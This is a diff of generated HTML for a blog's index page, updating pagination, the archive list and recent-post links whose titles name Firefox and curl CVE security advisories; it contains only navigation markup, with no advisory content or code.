+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5467%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3w000qyy3e8end1a7d" class="article-share-link">Share</a>
+      
+      
     </footer>
   </div>
   
@@ -539,7 +701,7 @@
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/page/10/">&amp;laquo; __(&#39;prev&#39;)</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/12/">__(&#39;next&#39;) &amp;raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/10/">&amp;laquo; __(&#39;prev&#39;)</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/12/">__(&#39;next&#39;) &amp;raquo;</a>
   </nav>
 </section>
         
@@ -571,7 +733,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
     </div>
   </div>
 
@@ -584,23 +746,23 @@
       <ul>
         
           <li>
-            <a href="/2022/04/22/firefox-CVE-2017-5470%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5470安全公告</a>
+            <a href="/2022/05/19/curl-CVE-2019-5481%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-5481安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/04/22/firefox-CVE-2017-5432%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">(no title)</a>
+            <a href="/2022/05/19/curl-CVE-2019-5482%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-5482安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/04/22/firefox-CVE-2017-5433%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">(no title)</a>
+            <a href="/2022/05/19/curl-CVE-2018-16890%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2018-16890安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/04/22/firefox-CVE-2017-5434%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">(no title)</a>
+            <a href="/2022/05/19/curl-CVE-2019-3822%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-3822安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/04/22/firefox-CVE-2017-5435%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">(no title)</a>
+            <a href="/2022/05/19/curl-CVE-2019-3823%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-3823安全公告</a>
           </li>
         
       </ul>
